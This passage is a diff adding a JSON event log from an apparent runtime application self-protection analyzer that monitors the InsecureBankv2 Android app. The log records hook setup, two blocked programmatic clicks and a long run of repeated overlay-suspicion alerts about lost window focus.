@@ -1,0 +1,1656 @@
+{
+  "report_meta": {
+    "generated_at": "2026-06-11T22:01:46.692476",
+    "tool": "RASP Dynamic Analyzer v2.0",
+    "target_app": "com.android.insecurebankv2",
+    "session_id": "run_001_20260611_213704",
+    "scenario": "all",
+    "total_events": 274
+  },
+  "events": [
+    {
+      "timestamp": "2026-06-11T21:37:15.397121",
+      "level": "info",
+      "threat": "SYSTEM",
+      "details": "Hook #1+#2b (ATS / View.dispatchTouchEvent + FLAG_WINDOW_IS_OBSCURED) -- OK"
+    },
+    {
+      "timestamp": "2026-06-11T21:37:15.401174",
+      "level": "info",
+      "threat": "SYSTEM",
+      "details": "Hook #2 (Overlay / onWindowFocusChanged) -- OK"
+    },
+    {
+      "timestamp": "2026-06-11T21:37:15.409176",
+      "level": "info",
+      "threat": "SYSTEM",
+      "details": "Hook #3a (Network / DefaultHttpClient.execute) -- OK"
+    },
+    {
+      "timestamp": "2026-06-11T21:37:15.416828",
+      "level": "info",
+      "threat": "SYSTEM",
+      "details": "Hook #3b (Network / URL.$init) -- OK"
+    },
+    {
+      "timestamp": "2026-06-11T21:37:15.418312",
+      "level": "info",
+      "threat": "SYSTEM",
+      "details": "=== All hooks active. Monitoring started. ==="
+    },
+    {
+      "timestamp": "2026-06-11T22:01:39.634939",
+      "level": "critical",
+      "threat": "ATS Bot Activity",
+      "details": "Programmatic click BLOCKED! Source: 4098, DeviceID: -1"
+    },
+    {
+      "timestamp": "2026-06-11T22:01:39.638029",
+      "level": "critical",
+      "threat": "ATS Bot Activity",
+      "details": "Programmatic click BLOCKED! Source: 4098, DeviceID: -1"
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.432671",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.453231",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.474472",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.481873",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.488557",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.498873",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.505638",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.525253",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.548871",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.560068",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.569231",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.576668",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.591340",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.608725",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.675714",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.692387",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.699695",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.709656",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.719335",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.723213",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.726572",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.747713",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.756219",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.765560",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.795549",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.816614",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.837771",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.861758",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.875518",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.884485",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.905189",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.915670",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.932007",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.936439",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.961246",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.979931",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.984344",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.984779",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.999008",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:43.999191",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.027948",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.092946",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.105753",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.112030",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.126523",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.132625",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.159642",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.176332",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.195752",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.205358",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.214485",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.226730",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.233710",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.245199",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.251799",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.261216",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.288720",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.290158",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.299100",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.306978",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.312874",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.317797",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.324076",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.328555",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.333333",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.339475",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.344708",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.349468",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.354882",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.362340",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.367175",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.374311",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.379541",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.384808",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.392231",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.397464",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.403405",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.409588",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.415122",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.425657",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.426975",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.431158",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.436095",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.442704",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.447594",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.455196",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.461553",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.465623",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.473132",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.476058",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.477479",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.484069",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.491133",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.494484",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.499639",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.505514",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.515582",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.516864",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.520491",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.524092",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.528041",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.531221",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.534640",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.541873",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.545378",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.549181",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.555176",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.560516",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.565371",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.570653",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.575557",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.579569",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.590520",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.593266",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.597285",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.601545",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.607659",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.615574",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.616489",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.621852",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.626280",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.630397",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.634692",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.639323",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.648848",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.656134",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.662964",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.668231",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.675854",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.681268",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.684965",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.691376",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.694772",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.698923",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.703484",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.708250",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.712531",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.715442",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.720369",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.724438",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.728459",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.732000",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.735575",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.741232",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.745427",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
+      "timestamp": "2026-06-11T22:01:44.753441",
+      "level": "alert",
+      "threat": "Overlay-proxy",
+      "details": "Window focus lost (keyboard not open). Possible overlay or external activity in foreground."
+    },
+    {
